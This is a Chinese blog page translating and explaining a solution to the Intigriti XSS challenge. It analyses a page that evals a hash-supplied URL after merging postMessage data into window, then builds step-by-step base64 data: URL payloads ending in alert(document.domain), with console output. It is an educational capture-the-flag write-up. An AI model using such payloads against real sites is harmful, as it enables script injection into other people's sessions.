<!DOCTYPE html><html lang="zh-cn"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="damn1t"><meta name="renderer" content="webkit"><meta name="copyright" content="damn1t"><meta name="keywords" content="damn1t"><meta name="description" content="404"><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>Intigriti XSS Challenge - Solution and problem solving approach · Damn1t's Blog</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/favicon.png"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
  "use strict";
  // rel=preload support test
  if( !w.loadCSS ){
    w.loadCSS = function(){};
  }
  // define on the loadCSS obj
  var rp = loadCSS.relpreload = {};
  // rel=preload feature support test
  // runs once and returns a function for compat purposes
  rp.support = (function(){
    var ret;
    try {
      ret = w.document.createElement( "link" ).relList.supports( "preload" );
    } catch (e) {
      ret = false;
    }
    return function(){
      return ret;
    };
  })();

  // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
  // then change that media back to its intended value on load
  rp.bindMediaToggle = function( link ){
    // remember existing media attr for ultimate state, or default to 'all'
    var finalMedia = link.media || "all";

    function enableStylesheet(){
      link.media = finalMedia;
    }

    // bind load handlers to enable media
    if( link.addEventListener ){
      link.addEventListener( "load", enableStylesheet );
    } else if( link.attachEvent ){
      link.attachEvent( "onload", enableStylesheet );
    }

    // Set rel and non-applicable media type to start an async request
    // note: timeout allows this to happen async to let rendering continue in IE
    setTimeout(function(){
      link.rel = "stylesheet";
      link.media = "only x";
    });
    // also enable media after 3 seconds,
    // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
    setTimeout( enableStylesheet, 3000 );
  };

  // loop through link elements in DOM
  rp.poly = function(){
    // double check this to prevent external calls from running
    if( rp.support() ){
      return;
    }
    var links = w.document.getElementsByTagName( "link" );
    for( var i = 0; i < links.length; i++ ){
      var link = links[ i ];
      // qualify links to those with rel=preload and as=style attrs
      if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
        // prevent rerunning on link
        link.setAttribute( "data-loadcss", true );
        // bind listeners to toggle media back
        rp.bindMediaToggle( link );
      }
    }
  };

  // if unsupported, run the polyfill
  if( !rp.support() ){
    // run once at least
    rp.poly();

    // rerun poly on an interval until onload
    var run = w.setInterval( rp.poly, 500 );
    if( w.addEventListener ){
      w.addEventListener( "load", function(){
        rp.poly();
        w.clearInterval( run );
      } );
    } else if( w.attachEvent ){
      w.attachEvent( "onload", function(){
        rp.poly();
        w.clearInterval( run );
      } );
    }
  }


  // commonjs
  if( typeof exports !== "undefined" ){
    exports.loadCSS = loadCSS;
  }
  else {
    w.loadCSS = loadCSS;
  }
}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script></head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/logo.png"></div><!--.profile-saying
  i.fa.fa-comment
  .saying--><div class="cxo-profile-inner"><div class="profile-name">Damn1t</div><div class="profile-signature">for you I bleed myself dry</div><div class="friends"><div>FRIENDS</div><span><a href="//www.baidu.com" target="_black">baidu</a></span></div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/index-bg.png);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/">Damn1t's Blog</a></div><div class="intro-nav-label-box"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div></i><div class="clear"></div></section></nav><h1 class="post-title">Intigriti XSS Challenge - Solution and problem solving approach</h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2019-05-09</span></span><span class="post-intro-tags"><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="xss"> xss</a></span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><h1 id="Intigriti-XSS-Challenge-Solution-and-problem-solving-approach"><a href="#Intigriti-XSS-Challenge-Solution-and-problem-solving-approach" class="headerlink" title="Intigriti XSS Challenge - Solution and problem solving approach"></a>Intigriti XSS Challenge - Solution and problem solving approach</h1><p><strong>原文链接：</strong><a href="https://dee-see.github.io/intigriti/xss/2019/05/02/intigriti-xss-challenge-writeup.html" target="_blank" rel="noopener">https://dee-see.github.io/intigriti/xss/2019/05/02/intigriti-xss-challenge-writeup.html</a></p>
<p>这是基于chrome的漏洞，但是google确实🐮🍺，反应速度极快，我准备复现的时候已经修复了，不过我在ipad上的Google浏览器实验时成功了</p>
<p>Intigriti发布了一个有趣的小XSS挑战，它要求创建一个特殊的URL，既可以用来分配iframe的SRC，也可以发送到一个eval调用来弹出一个警报（document.domain），这是挑战的目标。但是我们如何实现？让我们回到开始，一步步分析。</p>
<p>注意：最终漏洞仅适用于Chrome，因此如果您想要跟进，我建议您使用chrome。</p>
<p>主要代码：<br><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="keyword">const</span> url = <span class="keyword">new</span> URL(<span class="built_in">decodeURIComponent</span>(<span class="built_in">document</span>.location.hash.substr(<span class="number">1</span>))).href.replace(<span class="regexp">/script|&lt;|&gt;/gi</span>, <span class="string">"forbidden"</span>);#<span class="built_in">document</span>.location.hash打印出‘#’后的内容</span><br><span class="line">  <span class="keyword">const</span> iframe = <span class="built_in">document</span>.createElement(<span class="string">"iframe"</span>); iframe.src = url; <span class="built_in">document</span>.body.appendChild(iframe);</span><br><span class="line">  iframe.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="built_in">window</span>.addEventListener(<span class="string">"message"</span>, executeCtx, <span class="literal">false</span>);&#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">executeCtx</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(e.source == iframe.contentWindow)&#123;</span><br><span class="line">      e.data.location = <span class="built_in">window</span>.location;</span><br><span class="line">      <span class="built_in">Object</span>.assign(<span class="built_in">window</span>, e.data);</span><br><span class="line">      <span class="built_in">eval</span>(url);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  &lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><ol>
<li>代码获取hash当前页面的url（＃后面的任何内容），从中解码URL实体，然后用字符串“forbidden”替换“script”，“&lt;”或“&gt;”的任何实例。结果分配给url变量</li>
<li>iframe是在当前页面创建，其src是url刚刚创建，有效地加载一个URL到iframe</li>
<li>当iframe完成加载时，我们开始监听message事件并executeCtx在提出时甚至调用</li>
<li>该executeCtx功能已定义</li>
</ol>
<ul>
<li><p>该功能确保事件来自 iframe</p>
</li>
<li><p>本次活动的有效载荷的location属性写入当前windows的location，大概是为了再次保护重定向另一个URL</p>
</li>
<li><p>有效载荷对象中的每个属性都分配给window带有Object.assign(window, e.data)行（这意味着我发送的任何内容executeCtx都将在window…中定义…非常有趣）</p>
</li>
<li><p>url变量被eval</p>
</li>
</ul>
<p>阅读完该代码后，我的第一个问题是：<code>message</code>事件是什么？事实证明，有一个用于跨源通信的API <code>window.postMessage</code>，它允许您将对象发送给收听该<code>message</code>事件的任何人。</p>
<h2 id="一步一步的利用"><a href="#一步一步的利用" class="headerlink" title="一步一步的利用"></a>一步一步的利用</h2><p>绕过过滤，尝试利用base64<br><a href="https://challenge.intigriti.io/#data:text/html;base64,PHNjcmlwdD5hbGVydCgnaGknKTs8L3NjcmlwdD4=，这是base64" target="_blank" rel="noopener">https://challenge.intigriti.io/#data:text/html;base64,PHNjcmlwdD5hbGVydCgnaGknKTs8L3NjcmlwdD4=，这是base64</a> for <code>&lt;script&gt;alert(&#39;hi&#39;);&lt;/script&gt;</code>，我得到了我的<code>alert！</code>但是<code>alert(document.domain)</code>从内部不起作用，iframe因为它是一个数据URL，并且没有域。我们有一个alert盒子，但我想从外面弹出它，所以我远远没有结束。</p>
<p>Posting a message to the parent window</p>
<p>我们的目标是执行<code>eval（url）</code>，我现在需要去post一个message从而执行<code>executeCtx</code>函数。所以我尝试刚了解到的这个api并使用以下脚本：<code>&lt;script&gt;window.postMessage(&quot;test&quot;, &quot;*&quot;)&lt;/script&gt;</code>，<code>postMessage</code>函数的第二个参数是目标源，我明白使用<code>&#39;*&#39;</code>是一个坏的尝试，因为它允许任何人可以截断我的message但是我并不在意毕竟这只是个挑战，所以结果就是构造了如下的url：</p>
<blockquote>
<p><a href="https://challenge.intigriti.io/#data:text/html;base64,PHNjcmlwdD53aW5kb3cucG9zdE1lc3NhZ2UoInRlc3QiLCAiKiIpPC9zY3JpcHQ+" target="_blank" rel="noopener">https://challenge.intigriti.io/#data:text/html;base64,PHNjcmlwdD53aW5kb3cucG9zdE1lc3NhZ2UoInRlc3QiLCAiKiIpPC9zY3JpcHQ+</a></p>
</blockquote>
<p>啥都没有。我在<code>executeCtx</code>下了断点但似乎没有命中。让我们回到<a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage" target="_blank" rel="noopener">MDN</a>了解<code>postMessage</code>函数是如何调用的<br><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">targetWindow.postMessage(message, targetOrigin, [transfer]);</span><br><span class="line"></span><br><span class="line">targetWindow</span><br><span class="line">A reference <span class="keyword">to</span> the <span class="built_in">window</span> <span class="literal">that</span> will receive the message. Methods <span class="keyword">for</span> obtaining such a reference include:</span><br><span class="line">- <span class="built_in">window</span>.open (<span class="keyword">to</span> spawn a <span class="keyword">new</span> <span class="built_in">window</span> <span class="keyword">and</span> <span class="keyword">then</span> reference <span class="literal">it</span>),</span><br><span class="line">- <span class="built_in">window</span>.opener (<span class="keyword">to</span> reference the <span class="built_in">window</span> <span class="literal">that</span> spawned <span class="keyword">this</span> one),</span><br><span class="line">- HTMLIFrameElement.contentWindow (<span class="keyword">to</span> reference an embedded &lt;iframefrom its parent <span class="built_in">window</span>),</span><br><span class="line">- <span class="built_in">window</span>.parent (<span class="keyword">to</span> reference the parent </span><br><span class="line"><span class="built_in">window</span> <span class="keyword">from</span> within an embedded &lt;iframe&gt;), <span class="keyword">or</span></span><br><span class="line">- <span class="built_in">window</span>.frames + an index value (named <span class="keyword">or</span> numeric).</span><br></pre></td></tr></table></figure></p>
<p>所以<code>postMessage</code>必须在window能够接收message的情况下被调用。于是调整我们的payload：<code>&lt;script&gt;window.parent.postMessage(&quot;test&quot;, &quot;*&quot;)&lt;/script&gt;</code>。我想要message能够被主视窗接收，所以<code>iframe</code>就是<code>windows.parent</code>，新的url如下：</p>
<blockquote>
<p><a href="https://challenge.intigriti.io/#data:text/html;base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKCJ0ZXN0IiwgIioiKTwvc2NyaXB0Pg" target="_blank" rel="noopener">https://challenge.intigriti.io/#data:text/html;base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKCJ0ZXN0IiwgIioiKTwvc2NyaXB0Pg</a></p>
</blockquote>
<p>好的！现在我得到了一个来自<code>executeCtx</code>的js错误<br><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">index</span>):<span class="number">31</span> Uncaught TypeError: Failed <span class="keyword">to</span> <span class="keyword">set</span> an indexed <span class="keyword">property</span> <span class="keyword">on</span> <span class="string">'Window'</span>: <span class="keyword">Index</span> <span class="keyword">property</span> setter <span class="keyword">is</span> <span class="keyword">not</span> supported.</span><br><span class="line">    at <span class="function"><span class="keyword">Function</span>.<span class="title">assign</span> <span class="params">(&lt;anonymous&gt;)</span></span></span><br><span class="line"><span class="function">    <span class="title">at</span> <span class="title">executeCtx</span> <span class="params">((<span class="keyword">index</span>)</span>:</span><span class="number">31</span>)</span><br></pre></td></tr></table></figure></p>
<p>这是因为数据是一个字符串所以我们遇到了<code>Object.assign(window, e.data);</code>问题。让我们先发送一个空对象。payload如下：<code>&lt;script&gt;window.parent.postMessage({}, &quot;*&quot;)&lt;/script&gt;</code>，转换为url如下：</p>
<blockquote>
<p><a href="https://challenge.intigriti.io/#data:text/html;base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt9LCAiKiIpPC9zY3JpcHQ+" target="_blank" rel="noopener">https://challenge.intigriti.io/#data:text/html;base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt9LCAiKiIpPC9zY3JpcHQ+</a></p>
</blockquote>
<p>结果是<code>Uncaught SyntaxError: Unexpected end of input</code>由<code>eval(url)</code>这一行抛出。所以如下的值<code>data:text/html;base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt9LCAiKiIpPC9zY3JpcHQ+</code>是无法去解析url变量中的有效js。</p>
<h2 id="将url转为js"><a href="#将url转为js" class="headerlink" title="将url转为js"></a>将url转为js</h2><p>现在我们的目标是让<code>eval(url)</code>解析有效的js（还没到思考xss的时候）。我知道有很多东西都能作为有效的js所以我跳出这个挑战尝试运行：<code>eval(&#39;data:text/html;base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt9LCAiKiIpPC9zY3JpcHQ+&#39;)</code>在我的控制台。如期望一样发生了相同的错误。“Unexpected end of input” 意味着解析器期望另一个token但已经到达了字符串的末尾。我的url是以<code>+</code>结束，对于JS的表达式而言它没有什么实际意义，所以让我们将他剔除。这会让我们的base64字符串无效但我们之后会回到这个地方<br><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>('data:text/html;<span class="built_in">base64</span>,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt9LCAiKiIpPC9zY3JpcHQ')</span><br><span class="line">VM42:<span class="number">1</span> Uncaught ReferenceError: text <span class="built_in">is</span> <span class="keyword">not</span> defined</span><br><span class="line">    <span class="built_in">at</span> <span class="built_in">eval</span> (<span class="built_in">eval</span> <span class="built_in">at</span> &lt;anonymous&gt; ((index):<span class="number">1</span>), &lt;anonymous&gt;:<span class="number">1</span>:<span class="number">6</span>)</span><br><span class="line">    <span class="built_in">at</span> &lt;anonymous&gt;:<span class="number">1</span>:<span class="number">1</span></span><br></pre></td></tr></table></figure></p>
<p>什么？<code>text</code> is not defined？起先我不知道<code>text</code>来自于哪儿，但我回看的时候。。。好吧。然后我令<code>text=1</code>再次执行<code>eval</code><br><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; text = <span class="number">1</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line">&gt; <span class="built_in">eval</span>('data:text/html;<span class="built_in">base64</span>,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt9LCAiKiIpPC9zY3JpcHQ')</span><br><span class="line">VM70:<span class="number">1</span> Uncaught ReferenceError: html <span class="built_in">is</span> <span class="keyword">not</span> defined</span><br><span class="line">    <span class="built_in">at</span> <span class="built_in">eval</span> (<span class="built_in">eval</span> <span class="built_in">at</span> &lt;anonymous&gt; ((index):<span class="number">1</span>), &lt;anonymous&gt;:<span class="number">1</span>:<span class="number">11</span>)</span><br><span class="line">    <span class="built_in">at</span> &lt;anonymous&gt;:<span class="number">1</span>:<span class="number">1</span></span><br></pre></td></tr></table></figure></p>
<p>哦！<code>html</code>？对了！url未带<code>+</code>结束是一个有效的JS。还是不懂？下面是url缩进之后：</p>
<blockquote>
<p>data: // a label for a goto</p>
<p>text/html; // divides the variable text by the variable html</p>
<p>base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt9LCAiKiIpPC9zY3JpcHQ // evalutes the base64 variable and the PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt9LCAiKiIpPC9zY3JpcHQ variable then returns the latter (see , operator)</p>
</blockquote>
<p>它肯定不是连贯的代码，但它是有效的JavaScript代码。字符串末尾的<code>+</code>只是一个简单的base64组件。我不断改进我的payload，只要遇到<code>+</code>则将他丢进垃圾桶直到以字母为结尾的base64编码能够是他成为有效的变量名</p>
<h2 id="最后考虑XSS"><a href="#最后考虑XSS" class="headerlink" title="最后考虑XSS"></a>最后考虑XSS</h2><p>所以如何让<code>eval</code>执行js呢，如何放入<code>alert(document.domain)</code>？我们回到<a href="https://developer.mozilla.org/" target="_blank" rel="noopener">MDN</a>了解data协议并寻找哪里能放入我的<code>alert</code><br><figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data:<span class="meta">[&lt;mediatype&gt;]</span>[;base64],&lt;data&gt;</span><br><span class="line"></span><br><span class="line">The mediatype is a MIME <span class="class"><span class="keyword">type</span> <span class="title">string</span>, <span class="title">such</span> <span class="title">as</span> '<span class="title">image</span>/<span class="title">jpeg</span>' <span class="title">for</span> <span class="title">a</span> <span class="title">JPEG</span> <span class="title">image</span> <span class="title">file</span>. <span class="title">If</span> <span class="title">omitted</span>, <span class="title">defaults</span> <span class="title">to</span> <span class="title">text</span>/<span class="title">plain</span>;<span class="title">charset</span></span>=US-ASCII</span><br></pre></td></tr></table></figure></p>
<p><code>; charset = US-ASCII</code>引起了我的注意。也许我可以把我的有效载荷放在那里？它甚至看起来像一个JavaScript变量赋值！所以我在我的控制台中尝试这个<br><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt; text = <span class="number">1</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line">&gt; html = <span class="number">1</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line">&gt; <span class="built_in">eval</span>('data:text/html;charset=alert(<span class="number">1</span>);<span class="built_in">base64</span>,whatever')</span><br><span class="line">Uncaught ReferenceError: <span class="built_in">base64</span> <span class="built_in">is</span> <span class="keyword">not</span> defined</span><br><span class="line">    <span class="built_in">at</span> <span class="built_in">eval</span> (<span class="built_in">eval</span> <span class="built_in">at</span> &lt;anonymous&gt; ((index):<span class="number">1</span>), &lt;anonymous&gt;:<span class="number">1</span>:<span class="number">33</span>)</span><br><span class="line">    <span class="built_in">at</span> &lt;anonymous&gt;:<span class="number">1</span>:<span class="number">1</span></span><br></pre></td></tr></table></figure></p>
<p>是的！<code>alert</code>成功pop了！虽然它抱怨base64没有被定义但是alert成功了那么又何必在意呢？是时候转向网站了！我更改我的payload为<code>&lt;script&gt;window.parent.postMessage({text:1, html:1, base64:1}, &quot;*&quot;)&lt;/script&gt;hi intigriti</code>记住<code>Object.assign(window, e.data)</code>这行将携带我post的message从而对<code>text</code>和<code>html</code>变量进行定义（我定义了base64但那不重要），末尾的<code>hi intigriti</code>可以逃离base64编码造成的末尾<code>+</code>存在。<br>于是url变为：</p>
<blockquote>
<p><a href="https://challenge.intigriti.io/#data:text/html;charset=alert(1);base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt0ZXh0OjEsIGh0bWw6MSwgYmFzZTY0OjF9LCAiKiIpPC9zY3JpcHQ+aGkgaW50aWdyaXRp" target="_blank" rel="noopener">https://challenge.intigriti.io/#data:text/html;charset=alert(1);base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt0ZXh0OjEsIGh0bWw6MSwgYmFzZTY0OjF9LCAiKiIpPC9zY3JpcHQ+aGkgaW50aWdyaXRp</a></p>
</blockquote>
<p>但是。。。并没有奏效<br>data URLs最棒的一点就是你可以将他们放在你的地址栏然后查看结果，这一data URL：</p>
<blockquote>
<p>data:text/html;charset=alert(1);base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt0ZXh0OjEsIGh0bWw6MSwgYmFzZTY0OjF9LCAiKiIpPC9zY3JpcHQ+aGkgaW50aWdyaXRp</p>
</blockquote>
<p>回显的信息是“This site can’t be reached”，研究了一阵我发现<code>alert(1)</code>的括号搞砸了这一切</p>
<h2 id="最后一步"><a href="#最后一步" class="headerlink" title="最后一步"></a>最后一步</h2><p>我花了大量的时间努力寻求不需要括号去调用函数的可替代方式直到我发现或许我并不需要<code>charset=</code>，或许移除它就能绕过破坏我url的字符验证。现在尝试：</p>
<blockquote>
<p><a href="https://challenge.intigriti.io/#data:text/html;alert(1);base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt0ZXh0OjEsIGh0bWw6MSwgYmFzZTY0OjF9LCAiKiIpPC9zY3JpcHQ+aGkgaW50aWdyaXRp" target="_blank" rel="noopener">https://challenge.intigriti.io/#data:text/html;alert(1);base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt0ZXh0OjEsIGh0bWw6MSwgYmFzZTY0OjF9LCAiKiIpPC9zY3JpcHQ+aGkgaW50aWdyaXRp</a></p>
</blockquote>
<p><code>alert(1)</code>成功了！，最后稍微调整一下</p>
<blockquote>
<p><a href="https://challenge.intigriti.io/#data:text/html;alert(document.domain);base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt0ZXh0OjEsIGh0bWw6MSwgYmFzZTY0OjF9LCAiKiIpPC9zY3JpcHQ+aGkgaW50aWdyaXRp" target="_blank" rel="noopener">https://challenge.intigriti.io/#data:text/html;alert(document.domain);base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt0ZXh0OjEsIGh0bWw6MSwgYmFzZTY0OjF9LCAiKiIpPC9zY3JpcHQ+aGkgaW50aWdyaXRp</a></p>
</blockquote>
<p><img src="https://dee-see.github.io/images/intigriti_xss_victory.png" alt=""></p>
<p><strong>注意</strong>：早上我升级了我的chrome，上述的方法100%不奏效了。我并没有额外的测试但我认为是因为<code>iframe</code>是在<code>message</code>事件监听被启用前调用的。所以添加一个<code>setTimeout</code>去延迟<code>postMessage</code>调用可能会修复这个问题，这一建议由<a href="https://twitter.com/ephreet1/status/1124220724770738176" target="_blank" rel="noopener">@ephreet</a>.提出</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>作为xss挑战，这有大量的代码审计。下面就是我的主要步骤：</p>
<ul>
<li>理解代码是如何运行的将有很大帮助</li>
<li>不要过多关注目标，而是要有计划的针对中间步骤</li>
<li>当你对要解决的挑战手足无措时不要紧张，解决好每一步，答案便会逐渐清晰</li>
</ul>
<p>谢谢<a href="https://twitter.com/intigriti/" target="_blank" rel="noopener">@intigriti</a>我玩得很开心！恭喜大家，祝你们好运！</p>
<h2 id="什么是data-url-schema"><a href="#什么是data-url-schema" class="headerlink" title="什么是data url schema"></a>什么是data url schema</h2><p>data URI scheme 允许我们使用内联（inline-code）的方式在网页中包含数据，目的是将一些小的数据，直接嵌入到网页中，从而不用再从外部文件载入。常用于将图片嵌入网页。</p>
<h3 id="Data-URI的格式规范"><a href="#Data-URI的格式规范" class="headerlink" title="Data URI的格式规范,"></a>Data URI的格式规范,</h3><figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">data:<span class="meta">[&lt;mime type&gt;]</span>[;charset=&lt;charset&gt;][;&lt;encoding&gt;],&lt;encoded data&gt;</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span>  data ：协议名称；</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>  <span class="meta">[&lt;mime type&gt;]</span> ：可选项，数据类型（image/png、text/plain等）</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>  [;charset=&lt;charset&gt;] ：可选项，源文本的字符集编码方式</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span>  [;&lt;encoding&gt;] ：数据编码方式（默认US-ASCII，BASE64两种）</span><br><span class="line"></span><br><span class="line"><span class="number">5.</span>  ,&lt;encoded data&gt; ：编码后的数据</span><br></pre></td></tr></table></figure>
<p>目前，Data URI scheme支持的类型有：<br><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">data</span>:,                            文本数据</span></span><br><span class="line"><span class="class"><span class="keyword">data</span>:text/plain,                    文本数据</span></span><br><span class="line"><span class="class"><span class="keyword">data</span>:text/html,                  <span class="type">HTML</span>代码</span></span><br><span class="line"><span class="class"><span class="keyword">data</span>:text/html;base64,            base64编码的<span class="type">HTML</span>代码</span></span><br><span class="line"><span class="class"><span class="keyword">data</span>:text/css,                    <span class="type">CSS</span>代码</span></span><br><span class="line"><span class="class"><span class="keyword">data</span>:text/css;base64,              base64编码的<span class="type">CSS</span>代码</span></span><br><span class="line"><span class="class"><span class="keyword">data</span>:text/javascript,              <span class="type">Javascript</span>代码</span></span><br><span class="line"><span class="class"><span class="keyword">data</span>:text/javascript;base64,        base64编码的<span class="type">Javascript</span>代码</span></span><br><span class="line"><span class="class"><span class="keyword">data</span>:image/gif;base64,            base64编码的gif图片数据</span></span><br><span class="line"><span class="class"><span class="keyword">data</span>:image/png;base64,            base64编码的png图片数据</span></span><br><span class="line"><span class="class"><span class="keyword">data</span>:image/jpeg;base64,          base64编码的jpeg图片数据</span></span><br><span class="line"><span class="class"><span class="keyword">data</span>:image/x-icon;base64,          base64编码的icon图片数据</span></span><br></pre></td></tr></table></figure></p>
<p>参考链接：<a href="https://www.jianshu.com/p/ea49397fcd13" target="_blank" rel="noopener">https://www.jianshu.com/p/ea49397fcd13</a></p>
</article><!-- lincense--><div class="license-wrapper"><p> <span>Author:  </span><a href="http://microvorld.com">damn1t</a></p><p> <span>Link:  </span><a href="http://microvorld.com/2019/05/09/vulnerable/intigriti xss challenge/">http://microvorld.com/2019/05/09/vulnerable/intigriti xss challenge/</a></p><p> <span>Copyright:  </span><span>All articles in this blog are licensed under <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/3.0">CC BY-NC-SA 3.0</a> unless stating additionally.</span></p></div><div class="post-paginator"><a class="prevSlogan" href="/2019/05/12/cve/CVE-2018-8715/" title="CVE-2018-8715"><span>< PreviousPost</span><br><span class="prevTitle">CVE-2018-8715</span></a><a class="nextSlogan" href="/2019/05/07/靶机/FristiLeak/" title="vulnhub--FristiLeaks v1.3"><span>NextPost ></span><br><span class="nextTitle">vulnhub--FristiLeaks v1.3</span></a><div class="clear"></div></div><div id="comment"></div></section></article><footer id="cxo-footer-outer"><div id="cxo-footer-inner"><p class="footer-container"><span>Site by </span><a href="http://hexo.io"><span>Hexo</span></a><span> | theme </span><a href="https://github.com/Longlongyu/hexo-theme-Cxo"><span>Cxo</span></a></p><i class="fa fa-user"> </i><span id="busuanzi_value_site_uv"></span><span> | </span><i class="fa fa-eye"> </i><span id="busuanzi_value_site_pv"></span></div></footer><!-- catelog--><div class="toc-wrapper" style="top: 70vh;"><div class="toc-catalog"><i class="fa fa-list"> </i><span>CATALOG</span></div><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Intigriti-XSS-Challenge-Solution-and-problem-solving-approach"><span class="toc-number">1.</span> <span class="toc-text">Intigriti XSS Challenge - Solution and problem solving approach</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#分析"><span 